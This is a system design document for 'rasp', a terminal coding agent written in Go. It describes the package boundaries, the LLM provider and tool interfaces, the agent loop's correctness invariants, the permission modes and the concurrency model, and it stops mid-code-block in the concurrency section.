# rasp — system design

How rasp is built. The [PRD](prd.md) covers what and why; [scope.md](scope.md) draws the v1
line; this document is architecture — boundaries, interfaces, data flow, concurrency.

Design choices that rest on evidence cite [findings.md](findings.md).

---

## 1. Architecture at a glance

```
┌──────────────────────────────────────────────────────────────────────────┐
│ cmd/rasp                          CLI entry. Cobra. Wires everything.    │
└───────────────┬──────────────────────────────────┬───────────────────────┘
                │                                  │
      ┌─────────▼──────────┐            ┌──────────▼──────────┐
      │ internal/tui       │            │ internal/headless   │
      │ Bubble Tea v2      │            │ rasp run -p "..."   │
      │ chat-first, one    │            │ prints to stdout    │
      │ scrolling column   │            │                     │
      └─────────┬──────────┘            └──────────┬──────────┘
                │  consumes agent.Event            │  consumes agent.Event
                └────────────────┬─────────────────┘
                                 │
┌────────────────────────────────▼─────────────────────────────────────────┐
│ internal/agent          THE CORE. Knows nothing about terminals.         │
│                         Owns the step loop. Emits typed agent.Event.     │
│                         Enforces every correctness invariant.            │
└──┬──────────┬──────────┬───────────┬───────────┬───────────┬─────────────┘
   │          │          │           │           │           │
┌──▼───┐ ┌────▼────┐ ┌───▼─────┐ ┌───▼──────┐ ┌──▼──────┐ ┌──▼─────────┐
│ llm  │ │ tool    │ │ session │ │ compact  │ │ prompt  │ │ permission │
│      │ │ registry│ │ JSONL   │ │ prune +  │ │ system  │ │ ladder +   │
│ prov │ │ +8 built│ │ append  │ │ summarize│ │ prompt  │ │ MODES      │
│ -ider│ │ +N mcp  │ │ -only   │ │          │ │ AGENTS  │ │            │
└──┬───┘ └──┬───┬──┘ └─────────┘ └──────────┘ └─────────┘ └────────────┘
   │        │   │
┌──▼─────┐ ┌▼───▼──────┐  ┌──────────┐  ┌────────┐
│anthropic│ │ mcp      │  │ workspace│  │ auth   │
│oaicompat│ │ stdio    │  │ os.Root  │  │ Cred   │
└─────────┘ │ manager  │  └──────────┘  └────────┘
            └────┬─────┘
                 │ one goroutine + subprocess per server
        ┌────────▼────────┐
        │ mcp servers     │
        │ (child procs)   │
        └─────────────────┘
```

**Four layers, one process.**

**The core (`internal/agent`)** owns the loop and nothing else. It has no import of
`bubbletea`, `lipgloss`, or anything terminal-shaped — enforced by a lint rule, not by
discipline. It receives a user message, drives the loop to completion, and emits `agent.Event`
values. Every correctness invariant lives here: `tool_use`/`tool_result` pairing, the
truncated-tool-call guard, loop detection, panic recovery.

**The frontends** consume that event stream. The TUI is primary; the headless runner is a
twenty-line consumer that prints and exits. Neither reaches into agent state — they see
events, and they call methods (`Send`, `Cancel`, `Steer`, `SetMode`). This is the seam Crush
and opencode both paid for and then benefited from: opencode replaced its entire client, in a
different language, without touching the server contract.
We get the same seam in-process, for free.

**The services** are leaf packages. They do not import each other except through interfaces
defined in `llm` and `tool`. `agent` is the only package that composes them.

**Two things worth calling out in the diagram.** The tool registry holds both built-in tools
and MCP tools — the model sees one flat list and cannot tell them apart, which is the whole
point. And the permission service owns **modes**; the loop does not know modes exist.

---

## 2. Package layout

Modelled on neo's tree (25k LOC, readable end to end), not Crush's (145k LOC). The "does
**not** contain" column is the load-bearing half.

```
cmd/rasp/
  main.go              Cobra root; flag parsing; wiring
  run.go               `rasp run -p "..."` headless
  session.go           `rasp session list|show`
  mcp.go               `rasp mcp list|check`
  config.go            `rasp config path|check`

internal/
  agent/               The loop. Step state. Event emission. Invariants.
  llm/                 Provider-neutral types + the Provider interface
    anthropic/         Native adapter (caching, thinking, tool_use)
    openaicompat/      Base-URL-swappable adapter
    retry/             Two-tier retry, shared by both adapters
    fake/              Deterministic scripted provider for tests
  tool/                Tool interface, reflection schema gen, registry + snapshots
    builtin/           read, write, edit, bash, grep, find, ls, todos
    edit/              The four-rung match ladder (own package — it's the hard part)
  mcp/                 stdio client manager: spawn, initialize, tools/list, proxy, reap
  workspace/           os.Root confinement, path resolution, read-before-edit tracker
  wakelock/            per-platform idle-sleep inhibitor, held only during a turn
  permission/          The approval ladder, modes, presets, glob resolution
  session/             JSONL append store, atomic writes, resume
  compact/             Token estimation, tool-output pruning, LLM summarization
  prompt/              System prompt assembly, AGENTS.md discovery, cache breakpoints
  config/              Load, merge, validate; shell expansion for secrets
  auth/                Credential interface and its implementations
  tui/                 Bubble Tea v2 root model
    chat/              Message list, per-item render cache, streaming markdown
    diffview/          Unified diff renderer
    dialog/            Permission prompt, model picker, session picker, help
    styles/            Semantic colour tokens
  headless/            Event consumer that prints and exits
  logx/                slog to a file (stdout belongs to the TUI)
```

| Package | Owns | Does **not** contain |
|---|---|---|
| `agent` | The loop, step state, invariants, event emission | Any terminal code. Any HTTP. Any filesystem syscall. **Any knowledge of modes** |
| `llm` | Neutral `Message`/`Block`/`Event` types, `Provider` | Provider-specific structs; those live in the adapters |
| `llm/anthropic` | Anthropic wire translation, cache breakpoints | Retry policy (`llm/retry`); tool semantics |
| `tool` | The interface, schema reflection, the registry, per-turn snapshots | Any actual tool. Any UI. Any MCP protocol |
| `tool/builtin` | The eight tools | Path validation (`workspace`); approval (`permission`) |
| `tool/edit` | The match ladder and re-indentation | File I/O — a pure string function, which is why it's fuzzable |
| `mcp` | Subprocess lifecycle, JSON-RPC over stdio, tool discovery, call proxying | Permission decisions. Schema *interpretation*. Any transport but stdio. **And: no MCP type, error code or protocol concept may leave this package — see §8.0** |
| `workspace` | `os.Root` handle, path resolution, mtime tracking | Tool logic; permission decisions |
| `wakelock` | Holding an idle-sleep inhibitor for the duration of a turn | Deciding *when* a turn runs; any UI or logging beyond debug |
| `permission` | The ladder, session grants, **the four modes and their presets**, glob resolution, the yolo short-circuit | Any rendering. It publishes a request; someone else draws it |
| `session` | JSONL read/append, atomic write, listing | Compaction. Message semantics |
| `compact` | Estimation, pruning, summarization | Storage. It transforms `[]Entry` and returns a new one |
| `prompt` | Assembling ordered blocks with cache flags | Provider-specific cache syntax; the adapter applies that |
| `config` | The precedence chain, the deep merge, and the origin of every resolved value | Any behaviour a setting controls — it resolves values and never acts on them. And the `Mode` *type*: `permission` owns that (§7.1), so config knows only the names, since importing it would make config non-leaf |
| `tui` | All rendering and input | Any business logic. If it needs a decision, it asks `agent` or `permission` |

**The warning worth heeding:** pi's `agent-session.ts` is 3,342 lines — a carefully layered
codebase that collapsed into one file where the product gets assembled
([findings.md](findings.md)). Our equivalent risk is `internal/agent/agent.go`. When
it passes ~800 lines, split by concern (`step.go`, `tools.go`, `invariants.go`) before it
becomes the file nobody wants to open.

---

## 3. Core interfaces

### 3.1 Provider and the stream contract

```go
package llm

// StreamResponse is a pull-based iterator over stream events.
//
// CONTRACT — both halves matter:
//
//  1. It MUST NOT return a Go error for model, request or runtime failures.
//     Those arrive as a terminal Event{Type: EventError}. One error path,
//     not two, which is why the retry classifier can be a pure function
//     over a Message instead of a tangle of error-type switches.
//
//  2. Every event carries Partial — the FULL accumulated message so far,
//     not just the delta. Consumers render Partial. They never reassemble
//     deltas themselves. This deletes an entire class of interleaving bug.
type StreamResponse = iter.Seq[Event]

type Provider interface {
    // ID is the stable identifier: "anthropic", "openrouter", "ollama".
    ID() string

    // Stream runs exactly one model call. See the StreamResponse contract.
    Stream(ctx context.Context, req Request) StreamResponse
}
```

Both contracts come from pi verbatim, and both are cheap up front and painful to retrofit
([findings.md](findings.md)).

```go
type Request struct {
    Model     string
    System    []SystemBlock // ordered; see §11 for cache breakpoints
    Messages  []Message
    Tools     []ToolSpec    // from a per-turn snapshot; see §3.3
    MaxTokens int
    Thinking  ThinkingConfig
}

type EventType string

const (
    EventMessageStart   EventType = "message_start"
    EventTextDelta      EventType = "text_delta"
    EventThinkingDelta  EventType = "thinking_delta"
    EventToolInputStart EventType = "tool_input_start"
    EventToolInputDelta EventType = "tool_input_delta"
    EventToolCall       EventType = "tool_call" // arguments complete and parsed
    EventDone           EventType = "done"
    EventError          EventType = "error"
)

type Event struct {
    Type EventType

    Delta   string   // only the newly-arrived text; never authoritative
    Partial *Message // FULL accumulated message. ALWAYS populated.

    ToolCall *ToolCall // EventToolCall only

    StopReason StopReason // EventDone / EventError
    Err        error      // EventError; informational, not a control path
}
```

The neutral message model is Anthropic-shaped, because Anthropic's block model is the more
expressive of the two and translating down to OpenAI is easier than the reverse — the same
call neo made.

```go
type BlockType string

const (
    BlockText       BlockType = "text"
    BlockThinking   BlockType = "thinking"
    BlockToolUse    BlockType = "tool_use"
    BlockToolResult BlockType = "tool_result"
)

type Block struct {
    Type BlockType

    Text string // BlockText, BlockThinking

    ID    string          // BlockToolUse — provider-assigned call id
    Name  string          // BlockToolUse
    Input json.RawMessage // BlockToolUse

    ToolUseID string // BlockToolResult — MUST match a BlockToolUse.ID
    Content   string // BlockToolResult
    IsError   bool   // BlockToolResult
}

type Message struct {
    Role       Role
    Content    []Block
    StopReason StopReason
    Usage      Usage
    Model      string
    Provider   string
}

type StopReason string

const (
    StopEndTurn   StopReason = "end_turn"
    StopToolUse   StopReason = "tool_use"
    StopMaxTokens StopReason = "max_tokens" // TRUNCATION — see the guard in §4
    StopRefusal   StopReason = "refusal"
    StopAborted   StopReason = "aborted"
    StopError     StopReason = "error"
)
```

`StopMaxTokens` is called out because it is not merely informational — it triggers the
truncated-tool-call guard, and getting that wrong silently corrupts files.

### 3.1a What the contract deliberately does not check

`llm.CheckStream` is the contract above in executable form, and every adapter is run against
it. Three of its gaps are deliberate, and all three were settled the same way: **a rule that
rejects a wire format some provider actually sends costs more than the bug it would have
caught**, because the adapter's author cannot tell which of the two they are looking at.

**Which block a fragment landed in.** `Event` carries no block index, so an adapter that routes
call 2's fragment into call 1's arguments passes as long as both halves still parse — which is
internals §4.2's hazard exactly, arguments that parse and mean something else. Putting the
index on delta events does not close it. An adapter appends to a block and reports the index
from the same variable, so the check compares that variable against itself; catching a
mis-route needs the index derived twice by independent paths, and no adapter has a reason to do
that. For an OpenAI-compatible endpoint the wire's `tool_calls` index and the neutral message's
block index are different numbering spaces anyway, joined by the very mapping under suspicion.
The field would also invite a consumer to key off it, which is what contract rule 2 exists to
prevent. So there is no block index.

What survives is less well covered than it looks, and the honest version matters more than the
reassuring one. `checkToolCall` compares each announced call against its block byte for byte,
which is a real check against an adapter that assembles announcements separately — and the same
mirror as above against one that announces from the block it has just written into, which
compares a value with itself. A mis-route where both halves still parse is therefore **not
closed by this contract at all**. Closing it is the adapter's own tests against a recorded
response, where the wire and the neutral message are two independent things to compare.

The same blindness is why a call whose arguments genuinely are `{}` may be replaced wholesale
before it is announced: a block sitting at the empty object cannot be told from one still
holding the placeholder a provider opened it with. Tracking that difference was tried and
reverted — it rejected two real wire shapes.

**How many blocks one completing event may add to.** A single chunk from an OpenAI-compatible
endpoint can carry two `tool_calls` entries, so "at most one block per completing event" would
reject a faithful adapter in order to catch a payload landing in a sibling's arguments — which
a finished turn catches under the condition above, and misses under the same one. Revisit only
if a real adapter makes the stricter rule safe.

**That usage is reported at all.** `Message.Usage` is authoritative for context estimation
(§11), so an adapter that never maps it is a real bug. Requiring it here is still wrong: an
endpoint that reports no usage would be rejected, and §10.2's answer to missing metadata is to
degrade to estimates rather than refuse. An adapter that knows its own endpoint reports usage
asserts that itself.

Usage is held to one thing: **a count only ever grows.** An endpoint reporting nothing stays at
zero, which is monotone, so the rule rejects no wire shape at all. What it catches is a report
one field short — Anthropic's `message_delta` carries `output_tokens` alone, so an adapter that
assigns where it should merge drops the input count to zero, and the symptom surfaces a hundred
turns later as compaction firing at the wrong point.

It catches that only once the larger count has been published. An adapter that never maps
`message_start` in the first place climbs monotonically from zero and passes, because at this
level it is indistinguishable from an endpoint that reports nothing — which is the shape the
paragraph above refuses to reject. That half is the adapter's to assert, and M0-07 and M1-23
carry the requirement.

One consequence belongs here rather than in §12: **a retry wrapper cannot satisfy this
contract** by replaying attempt 2 after attempt 1. That is an event after the terminal one, a
second `*Message`, and content streamed then dropped, all at once. A retry after half a
streamed reply either abandons streaming on the first attempt, or discards what the user has
already seen.

### 3.2 Tool — one interface, two producers

MCP forces a decision here, and it is a better decision than we would have made without it.
Built-in tools derive their schema by reflection from a tagged Go struct. MCP tools receive a
JSON Schema from a server at runtime. **Both must satisfy the same interface**, so `Schema()`
returns a decoded JSON Schema object rather than anything Go-type-derived:

```go
package tool

type Tool interface {
    Name() string
    Description() string

    // Schema is a JSON Schema object describing the tool's input.
    //
    // map[string]any rather than a Go type is deliberate and load-bearing:
    // it is the only representation both a reflected Go struct and a
    // server-supplied schema can produce. It also lets provider adapters
    // strip keywords a given API rejects without re-deriving anything.
    //
    // For MCP tools this value is OPAQUE and passed through untouched. As of
    // MCP revision 2026-07-28, inputSchema/outputSchema accept the full
    // JSON Schema 2020-12 keyword set including $ref composition — so any
    // code assuming a flat object schema will break on a conforming server.
    // We do not normalize, validate or re-derive it. Ever.
    Schema() map[string]any

    Run(ctx context.Context, raw json.RawMessage) (Result, error)
}

// Sequential is optional. A tool that does not implement it runs CONCURRENTLY
// with its siblings — parallel is the default (pi's model).
//
// If any single call in a batch is sequential, the WHOLE batch runs
// sequentially. That is pi's rule, and it is the conservative reading: a tool
// declaring itself sequential usually means "I touch global state", and
// running it alongside unknown siblings defeats the point.
//
// The RUNTIME decides, never the model (neo's rule) — the model cannot request
// concurrency, which removes an entire trust question.
type Sequential interface {
    Sequential() bool
}
```

Parallel-by-default is a reversal of an earlier draft, and it is the more demanding choice: it
only works because of four mechanisms that must all exist together (§6 rules 4–6). Getting one
of them wrong produces data loss, not slowness.

**Producer 1 — reflection, for built-ins.** This was the one recommendation the research
reversed: neo hand-writes `map[string]any` literals, but Crush derives the schema from the Go
type, removing any possibility of drift between what the model was told and what we unmarshal
([findings.md §1](findings.md)).

```go
// New builds a Tool from a typed handler. TIn's struct tags produce the JSON
// Schema at construction time; TIn is also the unmarshal target.
// It is ONE WAY to produce a Tool, not the definition of one.
func New[TIn any](name, description string, run func(context.Context, TIn) (Result, error)) Tool
```

```go
type EditInput struct {
    Path       string `json:"path"                  desc:"Path to the file, relative to the workspace root"`
    OldString  string `json:"old_string"            desc:"Exact text to find. Must appear exactly once unless replace_all is set. Include enough surrounding context to be unambiguous."`
    NewString  string `json:"new_string"            desc:"Replacement text"`
    ReplaceAll bool   `json:"replace_all,omitempty" desc:"Replace every occurrence instead of requiring a unique match"`
}

var Edit = tool.New("edit", editDescription,
    func(ctx context.Context, in EditInput) (tool.Result, error) { /* ... */ })
```

The `desc` tags are prompt text and get hand-tuned like prompt text — but they live beside the
field they describe instead of in a parallel map that rots.

**Producer 2 — pass-through, for MCP.** See §8. The server's schema is used verbatim; we do
not attempt to validate or re-derive it.

### 3.3 The registry and per-turn snapshots

Built-in tools are static. MCP tools appear and disappear as servers connect, crash, or are
reconfigured. The registry must therefore be safe to mutate while the agent goroutine reads —
and, more subtly, **the tool list must stay byte-identical for the whole of one turn**,
because it sits inside the cached prompt prefix (§11).

Copy-on-write snapshots solve both at once:

```go
// Registry is mutable and concurrency-safe. It is written by the MCP manager
// and read only via Snapshot.
type Registry struct {
    mu      sync.RWMutex
    builtin []Tool
    dynamic map[string][]Tool // source ("mcp:github") → its tools
    version uint64
}

func (r *Registry) Replace(source string, tools []Tool) // MCP manager calls this
func (r *Registry) Remove(source string)

// Snapshot returns an immutable view. The agent takes exactly ONE per Send and
// holds it for every step of that turn. Consequences:
//
//   - the agent goroutine reads with no lock and no risk of the list shifting
//     under it mid-turn;
//   - the tool list — part of the cached prompt prefix — is stable, so a server
//     connecting mid-session costs one cache miss at the next turn rather
//     than a miss on every request;
//   - a crashed server's tools remain callable for the rest of the current
//     turn and fail as ordinary tool errors, which is exactly right.
func (r *Registry) Snapshot() *Set

type Set struct {
    tools   []Tool // ALWAYS sorted by name — see below
    byName  map[string]Tool
    version uint64
}

func (s *Set) Specs() []llm.ToolSpec // what goes into the request
func (s *Set) Get(name string) (Tool, bool)
```

**Ordering is not cosmetic.** `Set` sorts by name, and `Specs()` preserves that order, because
the tool list sits inside the cached prompt prefix (§11). An unstable order silently destroys
the cache on *every request* — expensive, and invisible until you look at
`cache_read_input_tokens` and find it pinned at zero. MCP revision 2026-07-28 now recommends
servers return `tools/list` in deterministic order for exactly this reason, but we sort anyway
rather than trusting every server to comply.

**Snapshot freshness** uses the `CacheableResult` fields the same revision made required on
`tools/list` (`ttlMs`, `cacheScope`). The MCP manager refreshes a server's tool list when its
TTL expires and calls `Replace`; the change becomes visible at the next turn's snapshot,
never mid-turn.

### 3.4 Result — data, never presentation

```go
// Result is what a tool returns. Content is what the MODEL sees. Details is an
// optional typed payload the UI may render richly. A tool never imports lipgloss.
//
// pi returns terminal components directly from its tools and flags this in its
// own analysis as a mistake — the tools become unusable by any other frontend.
// Crush does the opposite, with a separate renderer per tool family.
type Result struct {
    Content string // fed back to the model as a tool_result block
    IsError bool   // sets is_error; the model sees it and adapts
    Title   string // one-line summary for a collapsed tool card
    Details any    // *DiffDetails | *BashDetails | *SearchDetails | nil
}

type DiffDetails struct {
    Path                 string
    Unified              string // produced by go-udiff
    Additions, Deletions int
    Fuzzy                bool // matched via a normalized rung, not byte-exact
}

type BashDetails struct {
    Command   string
    ExitCode  int
    Duration  time.Duration
    Truncated bool
    SpillPath string // full output when Truncated
}
```

**A failing tool is not a Go error.** A test that fails, a file that doesn't exist, a command
that exits non-zero — all are information the model needs, so they come back as
`Result{IsError: true}` with `err == nil`. The Go `error` return is reserved for "the tool
itself could not run," which the loop also converts into an error result rather than
propagating.

### 3.5 The agent event union

The entire public surface between core and frontends.

```go
package agent

type EventKind string

const (
    EventStepStart      EventKind = "step_start"
    EventAssistantDelta EventKind = "assistant_delta" // Message = full partial
    EventAssistantEnd   EventKind = "assistant_end"
    EventToolStart      EventKind = "tool_start"
    EventToolProgress   EventKind = "tool_progress" // streaming bash output
    EventToolEnd        EventKind = "tool_end"
    EventPermission     EventKind = "permission"
    EventModeChange     EventKind = "mode_change"
    EventCompaction     EventKind = "compaction"
    EventTurnEnd    EventKind = "turn_end"
    EventError          EventKind = "error"
)

type Event struct {
    Kind      EventKind
    SessionID string

    Message *llm.Message // assistant_delta / assistant_end — full accumulation

    CallID string
    Tool   string
    Input  json.RawMessage
    Result *tool.Result
    Output string // tool_progress — accumulated so far

    Mode  permission.Mode // mode_change
    Usage llm.Usage       // turn_end
    Err   error
}
```

### 3.6 Credential

**API keys only in the MVP.** OAuth is phase 2 ([scope.md](scope.md)) — but the interface is
built refresh-capable now, because that is the single decision that makes OAuth additive
rather than a rewrite.

```go
package auth

// Credential resolves to a usable secret.
//
// Resolve is called before EVERY model call — never cached across a turn.
// A token that expires during a long tool phase gets refreshed instead of
// killing the turn. That is pi's rule. Today every implementation is
// effectively static; the call site is what matters.
type Credential interface {
    Resolve(ctx context.Context) (string, error)
}

// StaticKey — a literal, or the value of an environment variable.
type StaticKey string

func (k StaticKey) Resolve(context.Context) (string, error) { return string(k), nil }

// ShellKey runs a command and takes its trimmed stdout. This is how a user
// points at 1Password, pass, or gopass without us building keyring support:
//     "api_key": "$(op read op://vault/anthropic/key)"
type ShellKey struct {
    Command string
    ttl     time.Duration // small cache; forking per model call is too slow
}
```

### 3.7 Session storage

```go
package session

type EntryKind string

const (
    EntryMessage     EntryKind = "message"
    EntryModelChange EntryKind = "model_change"
    EntryModeChange  EntryKind = "mode_change"
    EntryCompaction  EntryKind = "compaction"
    EntryMeta        EntryKind = "meta"
)

type Entry struct {
    ID       string    `json:"id"`        // uuidv7 — lexically sorts by time
    ParentID string    `json:"parent_id"` // predecessor; reserved for /fork
    Kind     EntryKind `json:"kind"`
    Time     time.Time `json:"time"`

    Message  *llm.Message `json:"message,omitempty"`
    Model    string       `json:"model,omitempty"`
    Provider string       `json:"provider,omitempty"`
    Mode     string       `json:"mode,omitempty"`    // EntryModeChange
    Summary  string       `json:"summary,omitempty"` // EntryCompaction
    Replaced int          `json:"replaced,omitempty"`
}
```

`ParentID` ships in v1 even though branching does not. It costs one field now and makes
`/fork` a feature rather than a migration.

---

## 4. The agent loop

One `Send` drives the loop until the model stops asking for tools. Each iteration is a
**step** — one model call plus its tool execution. The whole `Send` is a **turn**.

```
Send(ctx, text)
  │
  ├─ tools := registry.Snapshot()          ← ONCE per turn. Stable for caching (§3.3)
  ├─ append user message; persist EntryMessage
  │
  └─ for step := 0; step < MaxSteps; step++ {        ← MaxSteps = 100, a fuse
       │
   (1) ├─ compact.MaybeReduce(transcript)            ← §11; emits EventCompaction
       │
   (2) ├─ cred.Resolve(ctx)                          ← every call, never cached
       │
   (3) ├─ stream := provider.Stream(ctx, req)
       │
   (4) ├─ for ev := range stream {                   ← consume to completion
       │     accumulate into `msg`
       │     EventTextDelta → emit EventAssistantDelta{Message: ev.Partial}
       │     EventToolCall  → BUFFER into pending[]        ← do NOT dispatch yet
       │     EventDone/Error → record stop reason
       │   }
       │
   (5) ├─ if stopReason == StopMaxTokens && len(pending) > 0 {
       │     fail EVERY pending call — truncated args may parse AND validate
       │     while being semantically wrong
       │   }
       │
   (6) ├─ if len(pending) == 0 {
       │     commit assistant message; emit EventTurnEnd; return
       │   }
       │
   (7) ├─ results := dispatch(pending, tools)        ← §6 rules 4-6
       │     partition on approval boundaries; run each group concurrently
       │     (cap 8) unless any call is Sequential; results land BY INDEX so
       │     tool_result order matches tool_use order regardless of completion
       │     per call: resolve from snapshot → permission → panic guard →
       │               per-file lock → run
       │
   (8) ├─ COMMIT assistant message AND results together, or neither
       │
   (9) ├─ if loopDetector.Repeating() { halt with a message to the user }
       │
       └─ continue
     }
```

### Why tool calls are buffered before dispatch (step 4 → 7)

Crush's comment says it plainly: *"Buffer dispatch until stream is fully consumed so that all
OnToolCall callbacks complete before any tool result is written."* Draining the stream first
guarantees the assistant message is complete before any result exists, which makes ordering
deterministic and makes opt-in parallelism a single flag rather than a redesign.

### Invariant 1 — `tool_use` never exists without `tool_result`

The most important thing in this document. An orphaned `tool_use` causes every provider to
reject the request — **permanently**, because the bad message is now in the history. The
session is bricked.

Three of the four reference projects solve this differently. We take two, because they cover
different failure modes:

**Prevent-on-write** (neo). The assistant message and its results are appended together or not
at all — step 8. On mid-turn cancellation, synthetic results are emitted for calls that
never ran:

```go
for i, call := range pending {
    if results[i] == nil {
        results[i] = &tool.Result{
            Content: "tool call was interrupted and did not produce a result; " +
                     "you may retry it if the result is still needed",
            IsError: true,
        }
    }
}
```

**Repair-on-read** (Crush). Prevent-on-write handles cancellation. It does not handle a
`SIGKILL`, a full disk, or a partial write. So the transcript is repaired every time it loads:

```go
// session.Sanitize runs on every Load. Bidirectional.
//   a) drop tool_results whose tool_use is missing
//   b) inject a synthetic error tool_result for every unanswered tool_use
func Sanitize(msgs []llm.Message) []llm.Message
```

About 40 lines. It makes the bricked-session bug structurally impossible rather than merely
unlikely.

### Invariant 2 — the truncated-tool-call guard (step 5)

If the model hit its output-token limit mid-emission, the JSON arguments of *every* tool call
in that message may be truncated. Truncated JSON can still parse and still validate against
the schema while being semantically wrong — an `edit` with a truncated `new_string` silently
destroys code. pi refuses to execute any of them.

### Invariant 3 — loop detection (step 9)

```go
// ~30 lines. neo's only runaway guard is MaxTurns=500; pi has none.
func (d *LoopDetector) Observe(name string, input json.RawMessage, output string) bool {
    sig := sha256.Sum256(slices.Concat([]byte(name), input, []byte(output)))
    d.recent = append(d.recent, sig)
    if len(d.recent) > 10 {
        d.recent = d.recent[1:]
    }
    return countOf(d.recent, sig) > 5
}
```

opencode's variant — three *consecutive* identical calls — is simpler and probably enough. We
take the windowed version because it also catches A-B-A-B oscillation.

### Invariant 4 — panic recovery per tool

```go
func runSafely(ctx context.Context, t Tool, raw json.RawMessage) (res Result, err error) {
    defer func() {
        if r := recover(); r != nil {
            res = Result{
                Content: fmt.Sprintf("tool panicked: %v\n\n%s", r, debug.Stack()),
                IsError: true,
            }
            err = nil // the model sees it and adapts; the process survives
        }
    }()
    return t.Run(ctx, raw)
}
```

This matters more with MCP in scope: a third-party server is code we did not write.

### Termination

| Condition | Behaviour |
|---|---|
| `StopEndTurn` / `StopRefusal`, no tool calls | Normal completion |
| `StopMaxTokens`, no tool calls | Complete; warn the reply was cut off |
| `StopAborted` | User interrupt; commit what exists, emit `EventTurnEnd` |
| `StopError` | Retry per §12, then surface to the user |
| Loop detector fires | Halt, tell the user what repeated |
| `step == MaxSteps` | Halt. A fuse, not a feature — reaching it is a bug |

---

## 5. Data flow: one turn, end to end

Tracing `> fix the failing auth test` from keystroke to rendered diff. Goroutine in brackets.

| # | Where | What happens |
|---|---|---|
| 1 | **[bubbletea]** | `tea.KeyPressMsg` → `Update` appends to the textarea. UI state mutates only here |
| 2 | **[bubbletea]** | Enter → append a user bubble optimistically, set `busy`, return a `tea.Cmd` |
| 3 | **[turn]** | Bubble Tea runs the `Cmd` on a fresh goroutine → `agent.Send(ctx, text)`. `ctx` carries the cancel func stored on the model for Esc |
| 4 | **[turn]** | `registry.Snapshot()` — one immutable tool set for the whole turn |
| 5 | **[turn]** | `compact.MaybeReduce` — usually a no-op |
| 6 | **[turn]** | `cred.Resolve` → API key. `prompt.Build` → ordered system blocks |
| 7 | **[turn]** | `provider.Stream(ctx, req)` opens the HTTP connection |
| 8 | **[sdk]** | SSE frames decoded on the SDK's own goroutine |
| 9 | **[turn]** | The `range` accumulates into `msg` and emits `EventAssistantDelta{Message: partial}` |
| 10 | **[pump]** | One goroutine drains the event channel, applies a 33ms debounce, calls `program.Send(agentEventMsg{ev})` |
| 11 | **[bubbletea]** | `Update` replaces the last assistant item's content, marks it dirty |
| 12 | **[bubbletea]** | `View` re-renders. The streaming item uses stable-prefix markdown; finished items above hit their cache and are skipped |
| 13 | **[turn]** | Stream ends `stop_reason: tool_use`, one buffered call: `edit(internal/auth/check.go, …)` |
| 14 | **[turn]** | Guards pass. `permission.Ask` consults the **mode's** preset (§7). Mode is `manual`, `edit` is `ask` → publishes `EventPermission`, **blocks on a channel** |
| 15 | **[bubbletea]** | Overlay renders. User presses `a`. `Update` calls `perms.Resolve(callID, DecisionAllowAlways)` |
| 16 | **[turn]** | `Ask` unblocks, returns nil |
| 17 | **[turn]** | `workspace.Resolve` validates the path through `os.Root`. The read-before-edit tracker confirms this session read the file and its mtime is unchanged |
| 18 | **[turn]** | Per-file mutex acquired (realpath-keyed). `tool/edit` runs the match ladder — a pure string function. Rung 1 hits |
| 19 | **[turn]** | Returns `Result{Content: "edited …", Details: &DiffDetails{Unified: …}}`; emits `EventToolEnd` |
| 20 | **[pump]** → **[bubbletea]** | `Update` appends a tool-call item carrying `*DiffDetails`. `diffview` renders it green/red. **The tool never knew a terminal existed** |
| 21 | **[turn]** | Assistant message + tool result committed together (§4). Appended to JSONL. Loop continues |
| 22 | **[turn]** | Second step returns text, `stop_reason: end_turn`. `EventTurnEnd` with usage |
| 23 | **[bubbletea]** | `busy = false`; status line updates tokens, cost and mode; the last item freezes its render cache forever |

**No state is shared between [turn] and [bubbletea].** The only channel between them is
`agent.Event` in one direction and method calls in the other.

---

## 6. Concurrency model

Go's concurrency is a reason to build this in Go, and also the easiest way to build something
subtly broken. The rule is single ownership.

| Goroutine | Owns | Lifetime |
|---|---|---|
| **[bubbletea]** `Update` | All UI state. The **only** goroutine that mutates it | Program lifetime |
| **[turn]** | The transcript, in-flight step state, the tool snapshot | One `Send`, spawned as a `tea.Cmd` |
| **[pump]** | Nothing. Drains the event channel → `program.Send` | Program lifetime |
| **[sdk]** | HTTP/SSE decoding | One stream |
| **[tool]** | One tool's execution | One call; spawned per call unless the batch is serial |
| **[bash-pump]** | Throttled output snapshots | One bash call |
| **[mcp-server]** | One MCP subprocess and its JSON-RPC framing | Program lifetime, one per configured server |

### The rules

**1. UI state mutates only in `Update`.** A `tea.Cmd` that writes model fields is a data race —
`View` reads the model concurrently. Anything a background goroutine wants to say becomes a
`tea.Msg`.

**2. Long-lived streams use `Program.Send`, not a blocking `tea.Cmd`.** A `Cmd` is
`func() tea.Msg` — one value, one time. Wrong shape for hundreds of deltas. neo's comment
notes they moved to direct `p.Send()` specifically to escape the backpressure of a hand-rolled
pump.

```go
// The entire agent → UI bridge.
go func() {
    for ev := range ag.Events() {
        program.Send(agentEventMsg{ev})
    }
}()
```

**3. Debounce below the UI, not inside it.** Crush coalesces streaming deltas in a 33ms window
at the persistence layer, so the UI never sees a per-token message. Terminal events (turn
end, error, tool end) bypass the debounce and flush immediately. Throttling lives where the
data is.

**4. Tool execution is parallel by default, and runtime-owned.** Tools run concurrently —
reads and writes alike — unless a tool implements `Sequential` and returns true, in which case
the entire batch degrades to serial. This is pi's model, and it is the aggressive choice: a
model that asks to read six files gets them at once.

The model never chooses. Concurrency is a property of the tool, decided by us.

MCP tools are **sequential by default**, inverting the rule for third-party code specifically:
we have no idea whether a given server is reentrant, and a server author cannot tell us. That
asymmetry is deliberate — our own tools are parallel because we audited them.

```go
// Dispatch runs a batch. Results land by index in a pre-sized slice, so
// completion order is irrelevant to result order (rule 6).
sem := make(chan struct{}, MaxParallelTools) // 8
var wg sync.WaitGroup
results := make([]*tool.Result, len(batch))

for i, call := range batch {
    wg.Add(1)
    go func(i int, call pendingCall) {
        defer wg.Done()
        select {
        case sem <- struct{}{}:
            defer func() { <-sem }()
            results[i] = runSafely(ctx, call) // panic guard + per-file lock inside
        case <-ctx.Done():
            results[i] = interruptedResult()
        }
    }(i, call)
}
wg.Wait()
```

**5. Approval is a serial barrier.** A call whose permission check will prompt the user cannot
run inside a concurrent batch — two prompts racing for one terminal is incoherent. The
dispatcher partitions the batch at each such call: run everything before it concurrently, wait,
prompt, run the call, then continue. This is neo's behaviour, and it is why the permission
check happens during partitioning rather than inside the goroutine.

```go
// Partition on approval boundaries before spawning anything.
for _, group := range partitionOnApproval(batch) {
    if group.needsApproval {
        results[group.idx] = runWithPrompt(ctx, group.call) // serial; may block on the user
        continue
    }
